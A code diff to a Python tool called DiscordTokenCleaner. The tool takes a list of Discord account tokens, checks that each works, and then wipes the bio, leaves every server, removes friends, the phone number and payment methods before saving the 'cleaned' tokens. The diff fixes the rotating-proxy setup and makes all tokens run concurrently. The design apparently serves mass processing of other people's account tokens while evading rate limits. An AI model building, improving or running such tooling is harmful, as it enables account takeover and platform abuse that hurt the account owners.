@@ -62,11 +62,15 @@ class DiscordTokenCleaner:
 
     async def get_proxy(self):
         """Rotate proxies if available."""
-        return random.choice(self.proxies) if self.proxies else None
+        if self.proxies:
+            proxy_url = random.choice(self.proxies)
+            return {"http://": proxy_url, "https://": proxy_url}
+        return None
 
     async def validate_token(self, token, progress):
         """Validate a Discord token."""
-        async with httpx.AsyncClient(proxies=await self.get_proxy()) as client:
+        proxy = await self.get_proxy()
+        async with httpx.AsyncClient(proxies=proxy) as client:
             try:
                 response = await client.get(
                     "https://discord.com/api/v9/users/@me",
@@ -83,7 +87,8 @@ class DiscordTokenCleaner:
 
     async def change_bio(self, token, new_bio=""):
         """Change the user's bio."""
-        async with httpx.AsyncClient(proxies=await self.get_proxy()) as client:
+        proxy = await self.get_proxy()
+        async with httpx.AsyncClient(proxies=proxy) as client:
             try:
                 response = await client.patch(
                     "https://discord.com/api/v9/users/@me",
@@ -98,7 +103,8 @@ class DiscordTokenCleaner:
 
     async def leave_servers(self, token):
         """Leave all servers."""
-        async with httpx.AsyncClient(proxies=await self.get_proxy()) as client:
+        proxy = await self.get_proxy()
+        async with httpx.AsyncClient(proxies=proxy) as client:
             try:
                 response = await client.get(
                     "https://discord.com/api/v9/users/@me/guilds",
@@ -120,7 +126,8 @@ class DiscordTokenCleaner:
 
     async def remove_friends(self, token):
         """Remove all friends."""
-        async with httpx.AsyncClient(proxies=await self.get_proxy()) as client:
+        proxy = await self.get_proxy()
+        async with httpx.AsyncClient(proxies=proxy) as client:
             try:
                 response = await client.get(
                     "https://discord.com/api/v9/users/@me/relationships",
@@ -143,7 +150,8 @@ class DiscordTokenCleaner:
 
     async def remove_phone(self, token):
         """Remove phone number."""
-        async with httpx.AsyncClient(proxies=await self.get_proxy()) as client:
+        proxy = await self.get_proxy()
+        async with httpx.AsyncClient(proxies=proxy) as client:
             try:
                 response = await client.patch(
                     "https://discord.com/api/v9/users/@me",
@@ -158,7 +166,8 @@ class DiscordTokenCleaner:
 
     async def remove_payment_methods(self, token):
         """Remove all payment methods."""
-        async with httpx.AsyncClient(proxies=await self.get_proxy()) as client:
+        proxy = await self.get_proxy()
+        async with httpx.AsyncClient(proxies=proxy) as client:
             try:
                 response = await client.get(
                     "https://discord.com/api/v9/users/@me/billing/payment-sources",
@@ -209,11 +218,8 @@ class DiscordTokenCleaner:
             console=console
         ) as progress:
             task = progress.add_task("Processing tokens...", total=len(self.tokens))
-            with ThreadPoolExecutor(max_workers=10) as executor:
-                tasks = [executor.submit(lambda t=token: asyncio.run(self.clean_token(t, options, progress))) for token in self.tokens]
-                for task in tasks:
-                    task.result()
-                    await asyncio.sleep(self.delay)
+            tasks = [self.clean_token(token, options, progress) for token in self.tokens]
+            await asyncio.gather(*tasks)
         with open(OUTPUT_FILE, "w") as f:
             for token in self.cleaned:
                 f.write(token + "\n")
